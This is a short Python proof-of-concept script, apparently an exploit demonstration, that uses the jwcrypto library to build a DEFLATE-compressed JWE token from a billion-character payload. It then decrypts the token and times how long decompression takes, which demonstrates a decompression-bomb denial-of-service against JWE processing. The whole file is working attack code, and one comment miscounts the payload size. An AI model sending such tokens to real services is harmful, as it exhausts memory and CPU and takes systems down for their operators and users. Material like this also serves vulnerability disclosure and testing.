import time
from jwcrypto import jwk, jwe

# Generate a much larger highly compressible payload
payload = 'A' * 1000000000  # 1,000,000,0000 characters of 'A' to ensure even higher compressibility

# Generate a new JWK key
key = jwk.JWK.generate(kty='oct', size=256)

# Prepare the JWE object with the compressible payload
jwetoken = jwe.JWE(payload.encode('utf-8'),
                   protected={'alg': 'A256KW', 'enc': 'A256CBC-HS512', 'zip': 'DEF'},
                   recipient=key)

# Serialize the token to compact format
compressed_jwetoken = jwetoken.serialize(compact=True)

# Print the size of the compressed token
print(f"Compressed JWE Token Length: {len(compressed_jwetoken)}")

# Function to simulate processing of the JWE token
def process_jwe(token, key):
    try:
        jwetoken = jwe.JWE()
        jwetoken.deserialize(token, key=key)
        decompressed_payload = jwetoken.payload
        print(f"Decompressed Payload Length: {len(decompressed_payload)}")
        return decompressed_payload
    except Exception as e:
        print(f"Error processing JWE token: {e}")

# Simulate the attack by processing the token
print("Simulating the attack...")
start_time = time.time()
process_jwe(compressed_jwetoken, key)
end_time = time.time()

print(f"Time taken to process the token: {end_time - start_time} seconds")